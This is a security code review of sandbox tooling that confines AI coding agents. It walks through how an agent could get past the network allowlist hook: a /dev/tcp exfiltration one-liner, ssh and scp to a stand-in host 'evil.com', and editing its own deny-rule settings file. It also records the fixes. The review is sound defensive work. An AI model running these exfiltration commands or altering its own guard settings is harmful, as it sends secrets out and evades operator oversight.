# Code Review — sandbox security pass

Scope: commit `a95b005` (initial `.ai-sandbox/` tooling, hooks, settings, docs).
Reviewed for correctness and security with a recall bias.

The dominant theme: the network allowlist is enforced at the **tool / command-string
layer** (Claude permission denylists + a PreToolUse hook that parses command text)
rather than at **L3 egress**. As a result several "enforced" guarantees are
bypassable in every mode except `offline` (`--network=none`).

## Findings

| # | Severity | File | Status |
|---|----------|------|--------|
| 1 | High (security/altitude) | run.sh / net-guard.sh | Documented/deferred (ADR-009 → NET-01) |
| 2 | High (security) | hooks/net-guard.sh:60 | Partially mitigated |
| 3 | Medium (security) | run.sh:165 | Documented limitation |
| 4 | Medium (security) | .claude/settings.json:16 | **Fixed** |
| 5 | Medium (security) | hooks/net-guard.sh:15 | **Fixed** |
| 6 | Medium (build) | .ai-sandbox/Dockerfile:22 | **Fixed** |
| 7 | Low | .ai-sandbox/run.sh:43 | **Fixed** |
| 8 | Low | hooks/net-guard.sh:19 | **Fixed** |

### 1. Allowlist bypassable in all non-offline modes (egress filtered at wrong layer)
In `default` and `webfetch` modes the rendered `settings.local.json` installs no
Bash hook, and the container runs on the default bridge network (no L3 filter).
The agent can run `bash -c 'exec 3<>/dev/tcp/1.2.3.4/443; cat secret >&3'` or
`python3 /home/sandbox/exfil.py` (python3 is installed; `/home/sandbox` is a
writable, exec-able mount). Neither is in any denylist → arbitrary-host exfil.

**Real fix:** move enforcement to L3 — an egress proxy or a netns/iptables egress
allowlist. The tool-layer denylist can only ever be defense-in-depth.

**Status — by design, not a regression to patch here.** Per `DECISIONS.md`
ADR-009 and `ARCHITECTURE.md`, L3 filtering in default/webfetch/dev is a
*consciously deferred* decision; only `offline` (`--network=none`) gives hard
isolation, and the real fix is tracked on the roadmap as **NET-01**
(iptables/nftables). Accordingly the L7 hook stays opt-in for `webfetch`/`dev`
only — it is **not** added to `default` (an earlier draft of this pass wrongly
did so; reverted). The net-guard hardening below still helps `dev` mode, where
Bash is already hooked.

### 2. net-guard host extraction misses non-URL network access (dev mode)
`extract_hosts_from_command` only matched `http(s)://`/`ssh://` URLs and literal
`git@host:`. In dev mode `ssh user@evil.com`, `python3 evil.py`, or `/dev/tcp`
yield zero hosts → the command is allowed. Mitigated by blocking
`/dev/tcp`,`/dev/udp` and extracting `user@host`/`host:path` for
ssh/scp/sftp/rsync; the general case still requires the L3 fix in #1.

**Self-review note:** the first cut of this mitigation regressed — a generic
`\S*@host` regex flagged email addresses as hosts (so `git config user.email`
and `git commit --author` were wrongly denied), and the `host:path` form only
matched `:/` so `scp loot evil.com:backup` still slipped through. Fixed by
gating `user@host`/`host:path` extraction on an ssh-family command actually
being present, plus a narrow `git@host:` rule. Covered by a 12-case test battery
(emails, rsync-local, scp relative/absolute, git scp-style, /dev/tcp, WebFetch).

### 3. dev mode gives Codex full network with no allowlist
`render_codex_config` sets `network_access = true` in dev mode. Codex is not
subject to net-guard (a Claude hook), so it can reach any host. Documented as a
known limitation of dev mode.

### 4. settings.local.json was editable from inside the sandbox — FIXED
`settings.json` protected `settings.json`/`.mcp.json`/`.ai-sandbox/**` but not
`.claude/settings.local.json`, the file holding the actual deny rules + hook,
which sits on the rw `/workspace` mount. Added deny entries and a read-only mount.

### 5. is_allowed_host failed open on empty host — FIXED
Empty host returned "allowed". WebFetch now explicitly denies an empty/unparseable
host; `is_allowed_host` denies empty input.

### 6. Dockerfile RUN heredoc requires BuildKit — FIXED
`build.sh` now exports `DOCKER_BUILDKIT=1` so the heredoc-based build works on
daemons where BuildKit is not the default.

### 7. `--mode` with no argument crashed under set -u — FIXED
Added argument-count guards in `run.sh` (and `update.sh` for `--codex`/`--claude`).

### 8. Allowlist trimming via `echo | xargs` was fragile — FIXED
Replaced with bash parameter-expansion trimming (no subshell, no quote mangling).
